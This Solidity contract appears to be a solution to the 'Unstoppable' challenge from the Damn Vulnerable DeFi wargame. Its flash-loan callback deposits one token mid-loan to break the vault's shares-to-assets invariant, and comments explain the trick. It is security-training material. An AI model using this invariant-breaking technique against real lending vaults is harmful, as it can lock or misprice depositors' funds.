// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "forge-std/console.sol";
import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import "solmate/auth/Owned.sol";
import {UnstoppableVault, ERC20} from "../unstoppable/UnstoppableVault.sol";

/**
 * @title ReceiverUnstoppable
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract ReceiverUnstoppable is Owned, IERC3156FlashBorrower {
    UnstoppableVault private immutable pool;

    error UnexpectedFlashLoan();

    constructor(address poolAddress) Owned(msg.sender) {
        pool = UnstoppableVault(poolAddress);
    }

    function onFlashLoan(
        address initiator,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata
    ) external returns (bytes32) {
        if (
            initiator != address(this) ||
            msg.sender != address(pool) ||
            token != address(pool.asset()) ||
            fee != 0
        ) revert UnexpectedFlashLoan();

        // During the flash loan (which should be greater than half of the
        // totalSupply in order to manipulate the shares function), make a
        // deposit, which will break the shares to assets ratio.

        // You can see here that 2 shares will come out of depositing 1, which
        // breaks the vaults 1-to-1 invariant.
        console.log("preview", pool.previewDeposit(1));

        ERC20(token).approve(address(pool), 1);
        pool.deposit(1, address(this));

        // Return the flash loan
        ERC20(token).approve(address(pool), amount);

        return keccak256("IERC3156FlashBorrower.onFlashLoan");
    }

    function executeFlashLoan(uint256 amount) external onlyOwner {
        address asset = address(pool.asset());
        pool.flashLoan(this, asset, amount, bytes(""));
    }
}
